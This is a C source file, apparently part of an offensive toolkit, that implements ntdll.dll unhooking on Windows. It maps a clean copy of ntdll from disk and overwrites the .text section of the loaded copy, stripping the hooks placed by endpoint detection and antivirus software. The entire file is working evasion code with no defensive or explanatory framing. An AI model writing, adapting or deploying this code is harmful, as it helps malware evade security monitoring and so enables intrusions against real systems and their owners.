#include "unhook.h"
#include <stddef.h>
#include <string.h>

static PIMAGE_NT_HEADERS64
pe_get_nt_headers(LPVOID base)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)((BYTE *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    return nt;
}

static PIMAGE_SECTION_HEADER
pe_find_text_section(PIMAGE_NT_HEADERS64 nt)
{
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD n = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < n; i++, sec++) {
        if (memcmp(sec->Name, ".text\0\0\0", 8) == 0)
            return sec;
    }
    return NULL;
}

BOOL jocky_unhook_ntdll(void)
{
    BOOL   result      = FALSE;
    HANDLE file_handle = INVALID_HANDLE_VALUE;
    HANDLE map_handle  = NULL;
    LPVOID clean_base  = NULL;

    /* Step 1: in-memory (hooked) NTDLL base */
    HMODULE hooked_base = GetModuleHandleW(L"ntdll.dll");
    if (!hooked_base)
        goto cleanup;

    /* Step 2: open on-disk clean copy */
    file_handle = CreateFileW(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (file_handle == INVALID_HANDLE_VALUE)
        goto cleanup;

    /* Step 3: create SEC_IMAGE mapping */
    map_handle = CreateFileMappingW(
        file_handle,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0, 0,
        NULL
    );
    if (!map_handle)
        goto cleanup;

    /* Step 4: map clean copy into address space */
    clean_base = MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0);
    if (!clean_base)
        goto cleanup;

    /* Step 5: parse PE headers of both copies */
    PIMAGE_NT_HEADERS64 hooked_nt = pe_get_nt_headers((LPVOID)hooked_base);
    PIMAGE_NT_HEADERS64 clean_nt  = pe_get_nt_headers(clean_base);

    if (!hooked_nt || !clean_nt) {
        SetLastError(ERROR_BAD_FORMAT);
        goto cleanup;
    }

    PIMAGE_SECTION_HEADER hooked_text = pe_find_text_section(hooked_nt);
    PIMAGE_SECTION_HEADER clean_text  = pe_find_text_section(clean_nt);

    if (!hooked_text || !clean_text) {
        SetLastError(ERROR_NOT_FOUND);   /* 1168 — standard Win32, always defined */
        goto cleanup;
    }

    BYTE  *hooked_text_ptr = (BYTE *)hooked_base + hooked_text->VirtualAddress;
    BYTE  *clean_text_ptr  = (BYTE *)clean_base  + clean_text->VirtualAddress;
    SIZE_T text_size       = (hooked_text->SizeOfRawData < clean_text->SizeOfRawData)
                               ? hooked_text->SizeOfRawData
                               : clean_text->SizeOfRawData;

    /* Step 6: make .text writable */
    DWORD old_protect = 0;
    if (!VirtualProtect(hooked_text_ptr, text_size,
                        PAGE_EXECUTE_READWRITE, &old_protect))
        goto cleanup;

    /* Step 7: overwrite hooked bytes with clean bytes */
    memcpy(hooked_text_ptr, clean_text_ptr, text_size);

    /* Step 8: restore original protection */
    DWORD dummy = 0;
    if (!VirtualProtect(hooked_text_ptr, text_size, old_protect, &dummy))
        goto cleanup;

    result = TRUE;

cleanup:
    ;   /* C99: label cannot be immediately followed by a declaration */
    DWORD saved_error = GetLastError();
    if (clean_base)                          UnmapViewOfFile(clean_base);
    if (map_handle)                          CloseHandle(map_handle);
    if (file_handle != INVALID_HANDLE_VALUE) CloseHandle(file_handle);
    if (!result)                             SetLastError(saved_error);
    return result;
}